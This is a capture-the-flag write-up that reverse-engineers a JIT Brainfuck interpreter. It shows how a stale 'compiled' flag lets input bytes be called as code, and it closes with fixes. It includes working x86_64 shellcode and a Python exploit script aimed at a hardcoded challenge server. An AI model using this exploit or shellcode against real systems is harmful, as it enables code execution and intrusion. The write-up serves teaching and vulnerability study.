# Brainfast CTF Write-Up - JIT Fragment Reuse -> Code Execution

## TL;DR
- The interpreter keeps a global fragment array across lines but only resets the fragment count.
- A stale `compiled` flag makes the runtime call a fragment's `src` pointer as code.
- On the next line, `src` points into our input buffer, so we jump into attacker-controlled bytes.
- Two-line payload: `++++[-]` (prime JIT) then `+[<shellcode>]` (execute).
- Flag: `hxp{Ju5T_1n_C4s3_yOU_th0ght_musl_i5_b3TteR_th4n_glibc}`

---

## 1) Challenge context
**Files provided**
- `vuln` (Brainfuck interpreter with JIT)
- `snippets.so` (machine-code snippets for BF ops)
- `flag.txt` (only on server container)
- `Dockerfile`, `compose.yml`

**How it runs**
- The service is exposed via `ynetd` and takes BF source line-by-line.
- The binary uses musl libc and a shared snippet library.

**Local run**
```bash
./ld-musl-x86_64.so.1 ./vuln
```

---

## 2) Recon and binary profile
From `readelf` and `nm`:
- PIE (`ET_DYN`), NX (`GNU_STACK` is RW), Full RELRO.
- Dynamically linked against `snippets.so` and `libc.musl-x86_64.so.1`.
- Core runtime APIs: `getline`, `mmap`, `mprotect`, `hcreate`, `hsearch`, `memcpy`.

`snippets.so` exports tiny code blocks for BF ops (`move_left`, `move_right`, `increment`, `decrement`, `io_in`, `io_out`, `compare`, `trap_nz`).

---

## 3) Interpreter architecture (reverse-engineered)
### 3.1 Tape mapping
The tape is mapped at a fixed address:
```
mmap(0x6efffffff000, 0x1000, PROT_READ|PROT_WRITE,
     MAP_PRIVATE|MAP_ANON|MAP_GROWSDOWN|MAP_FIXED, -1, 0)
```
Then the data pointer is moved down:
```
data = tape_base - 0x2000
```
Cells are 32-bit integers; `>` and `<` move by 4 bytes.

### 3.2 Fragment model
The interpreter splits the program into fragments around `[` and `]` by inserting NUL bytes and building a control-flow graph.

Struct layout (inferred from disassembly):
```
struct frag {
  char *src;        // +0x00
  struct frag *next; // +0x08
  struct frag *alt;  // +0x10
  uint32_t count;    // +0x18
  uint8_t compiled;  // +0x1c
};
```
Global array: `frags[0x1000]` at `b/0x40c0` with `fragp` as the index.

### 3.3 Line parsing and fragment creation
The parser walks the line and builds fragments. On `[` it:
1) Creates a new fragment struct in `frags[fragp]`.
2) Links `next` and `alt` pointers to wire the CFG.
3) Scans forward to the matching `]` (tracking nesting) and inserts NUL bytes to split the line.

Conceptual pseudocode:
```
fragp = 1
frags[0].src = line
frags[0].next = frags[0].alt = NULL
frags[0].count = 0

pc = line
while (*pc):
  if *pc == '[':
    new = &frags[fragp++]
    new->src = pc + 1
    current->next = new
    new->alt = current->alt
    // find matching ] and NUL-terminate
    scan = pc + 1
    depth = 1
    while depth:
      if *scan == '[': depth++
      if *scan == ']': depth--
      scan++
    *(scan - 1) = 0   // terminate fragment
    *pc = 0           // terminate previous fragment
    pc = scan
    current = new
  else:
    pc++
```

If the brackets do not match, execution transfers to a trap fragment that prints an error and `ud2`s.

### 3.4 Execution loop
At runtime, each fragment is executed. At the end, the current cell is checked:
- If `*data != 0`, follow `next`.
- Else follow `alt`.

This matches BF loop semantics (`[` and `]`).

---

## 4) JIT compilation details
Each fragment has a `count` that increments on execution. When it exceeds a threshold, the fragment is compiled:
- A new RW page is `mmap`'d.
- For each BF opcode in the fragment, a machine-code snippet from `snippets.so` is copied in.
- A `compare` snippet is appended to end the fragment.
- The page is set RX via `mprotect`.
- The fragment cache is stored in `hsearch`.

Important behavior from disassembly:
- `count` is incremented before execution.
- JIT compilation is entered when `count > 2`, so a fragment executes 4 times before being compiled.

---

## 5) The bug
**Root cause:** The fragment array is reused across lines, but the `compiled` flag is **never reset**.

At the start of each new line:
- `fragp` is set to 1
- `frags[0].count` is reset
- The rest of the fragment array (including `compiled` flags) is left intact

**Consequence:**
If a fragment slot was compiled on a previous line, it remains marked as `compiled=1` on the next line.

**Key instruction:**
When executing a fragment with `compiled=1`, the runtime does:
```
call r13
```
where `r13 = frag->src`.

But on a new line, `frag->src` points into the **input buffer** (not JIT code).
So the interpreter jumps directly into attacker-controlled bytes.

This is a classic **stale metadata -> direct control flow hijack** bug.

---

### 5.1 Quick verification (local)
You can observe the stale `compiled` flag with a helper script that reads `/proc/<pid>/mem`:
```
./writeup_linkedin/verify_compiled_flag.py
```
Example output:
```
PIE base: 0x7f...5000
frags[1].compiled: 01
```
This shows the flag is already set after the first line executes and is not cleared for the next line.

---

## 6) Exploit plan
We need two lines:

### Line 1: prime the compiled flag
We want `frags[1].compiled = 1`.

Minimal loop that executes 4 times:
```
++++[-]
```
- `++++` sets the cell to 4.
- `[-]` loops 4 times, so the loop-body fragment crosses the JIT threshold.
- `frags[1]` (the loop body) ends with `compiled=1`.

### Line 2: reuse the same fragment slot
We reuse `frags[1]` with a new loop, but now it points at our input bytes:
```
+[<shellcode>]
```
- `+` makes the loop execute at least once.
- The fragment is marked `compiled`, so `call r13` jumps into the bytes between `[` and `]`.

On the challenge server, the indirect call into the input buffer succeeds and executes the shellcode.
On a hardened local host, this may SIGSEGV due to NX; if that happens, run against the provided server/container.

---

## 7) Shellcode design
Constraints:
- No NUL bytes (`\x00`) because fragments are NUL-terminated.
- No newline (`\x0a`) because input is line-based.
- Avoid `[` and `]` bytes (`\x5b`, `\x5d`) because they affect parsing.

Goal: open `flag.txt`, read, write to stdout, exit.

**Assembly (x86_64)**
```
; open("flag.txt", O_RDONLY)
; read(fd, buf, 0x40)
; write(1, buf, n)
; exit(0)

xor eax, eax
push rax
mov rbx, 0x7478742e67616c66 ; "flag.txt"
push rbx
mov rdi, rsp
xor esi, esi
xor edx, edx
mov al, 2
syscall

mov rdi, rax
mov rsi, rsp
xor edx, edx
mov dl, 0x40
xor eax, eax
syscall

mov rdx, rax
xor edi, edi
inc edi
mov al, 1
syscall

mov al, 0x3c
xor edi, edi
syscall
```

**Hex bytes** (no bad bytes):
```
31c05048bb666c61672e747874534889e731f631d2b0020f05
4889c74889e631d2b24031c00f054889c231ffffc7b0010f05
b03c31ff0f05
```

---

## 8) Final exploit script
Python is used to send raw bytes cleanly:

```python
#!/usr/bin/env python3
import socket

HOST, PORT = "46.224.122.168", 1337

shell = bytes.fromhex(
    "31c05048bb666c61672e747874"
    "534889e731f631d2b0020f05"
    "4889c74889e631d2b24031c00f05"
    "4889c231ffffc7b0010f05"
    "b03c31ff0f05"
)

payload = b"++++[-]\n" + b"+[" + shell + b"]\n"

s = socket.create_connection((HOST, PORT), timeout=5)
print(s.recv(1024))
s.sendall(payload)
print(s.recv(4096))
```

**Observed output:**
```
$ 
$ hxp{Ju5T_1n_C4s3_yOU_th0ght_musl_i5_b3TteR_th4n_glibc}
```

---

## 9) Root cause summary
- The fragment array is reused across lines.
- `compiled` flags are not reset.
- Execution blindly `call`s `frag->src` when `compiled=1`.
- On the next input line, `frag->src` points to attacker-controlled bytes.

This is a **use-after-state** / stale metadata bug.

---

## 10) Fixes and mitigations
**Correctness fix**
- Reset all fragment metadata at the start of each line (`compiled`, `count`, `next`, `alt`).
- Or allocate fresh fragments per line and free them after execution.

**Defense in depth**
- Enforce W^X (never execute from RW memory).
- Mark input buffers non-executable (or run with `noexec` mappings).
- Validate that `frag->src` points to known RX JIT pages before calling.

---

## 11) Takeaways
- JIT designs are fragile when metadata is reused across inputs.
- A single stale flag can turn a safe dispatch into a raw indirect call.
- Even with PIE/NX/RELRO, control-flow bugs are still exploitable when execution is diverted to attacker-controlled memory.

---

## 12) Files and scripts
All artifacts referenced in this write-up are saved under:
```
/home/kali/Desktop/brainfast/brainfast/writeup_linkedin/
```
Included:
- `writeup.md` (this post)
- `exploit.py` (final exploit)
- `shellcode.asm` (assembly)
- `shellcode.hex` (hex string)
- `commands.sh` (reverse-engineering commands)
- `verify_compiled_flag.py` (local verification helper)
